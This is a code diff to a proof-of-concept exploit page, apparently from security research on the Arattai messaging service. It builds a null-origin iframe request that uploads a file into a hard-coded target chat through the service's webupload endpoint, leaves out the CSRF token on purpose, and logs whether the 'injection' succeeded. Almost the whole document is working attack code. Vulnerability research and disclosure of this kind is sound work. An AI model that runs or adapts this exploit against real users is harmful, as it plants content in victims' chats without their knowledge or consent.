@@ -12,13 +12,14 @@
 document.getElementById('host').textContent = location.origin;
 
 // ── CONFIG ────────────────────────────────────────────────────────────────────
-const TARGET_CHATID = "CT_1469007622159071968_3335514-GC";
-const FILE_NAME     = "important-invoice.txt";
-const FILE_BODY     = "This file was injected without the victim's knowledge (PoC 05b).";
+var TARGET_CHATID = "CT_1469007622159071968_3335514-GC";
+var FILE_NAME     = "important-invoice.txt";
+var FILE_BODY     = "This file was injected without the victim's knowledge (PoC 05b).";
 // ─────────────────────────────────────────────────────────────────────────────
 
-// Minimal headers confirmed from live request — no Upload-Id, no hash body,
-// no CSRF token, no X-Dfs-Service / X-Streammode / X-Body_attr_size needed.
+// Build the inner script as a string — runs inside sandbox="allow-scripts" iframe
+// (no allow-same-origin) so the browser sends Origin: null on the XHR.
+// Headers matched exactly to the confirmed-working Burp request with Origin: null.
 var inner = '';
 inner += 'var xhr=new XMLHttpRequest();';
 inner += 'xhr.open("POST","https://files.arattai.in/webupload");';
@@ -27,7 +28,8 @@ inner += 'xhr.setRequestHeader("X-Service","arattai");';
 inner += 'xhr.setRequestHeader("X-Arattai-Type","multi_recip");';
 inner += 'xhr.setRequestHeader("X-Arattai-Chatids",' + JSON.stringify(TARGET_CHATID) + ');';
 inner += 'xhr.setRequestHeader("File-Name",'          + JSON.stringify(FILE_NAME)     + ');';
-// X-Zcsrf-Token intentionally omitted
+inner += 'xhr.setRequestHeader("X-Cliq-Content-Type","");';
+// X-Zcsrf-Token intentionally omitted — confirming server does not validate it
 inner += 'xhr.onload=function(){parent.postMessage({type:"done",status:xhr.status,body:xhr.responseText},"*");};';
 inner += 'xhr.onerror=function(){parent.postMessage({type:"err",msg:"CORS preflight blocked or network error"},"*");};';
 inner += 'xhr.send(' + JSON.stringify(FILE_BODY) + ');';
@@ -40,14 +42,15 @@ window.addEventListener('message', function(e) {
     var d = e.data;
     if (d.type === 'sent') {
         log.textContent += '[SENT] POST /webupload  Origin: null\n';
-        log.textContent += '       File-Name: ' + FILE_NAME + '\n';
-        log.textContent += '       X-Arattai-Chatids: ' + TARGET_CHATID + '\n';
+        log.textContent += '       File-Name: '        + FILE_NAME    + '\n';
+        log.textContent += '       X-Arattai-Chatids: '+ TARGET_CHATID + '\n';
+        log.textContent += '       X-Cliq-Content-Type: (empty)\n';
         log.textContent += '       X-Zcsrf-Token: (omitted)\n\n';
     } else if (d.type === 'done') {
         log.textContent += '[RESPONSE] HTTP ' + d.status + '\n' + d.body + '\n';
         if (d.status === 200) {
-            log.textContent += '\n[CONFIRMED] File injected into chat without CSRF token.\n';
-            log.textContent += '            Check: ' + TARGET_CHATID + '\n';
+            log.textContent += '\n[CONFIRMED] Upload accepted without CSRF token via null-origin iframe.\n';
+            log.textContent += '            Check chat: ' + TARGET_CHATID + '\n';
             log.textContent += '            CLEANUP: delete the injected file from the chat.\n';
         } else {
             log.textContent += '[RESULT] HTTP ' + d.status + ' — rejected.\n';
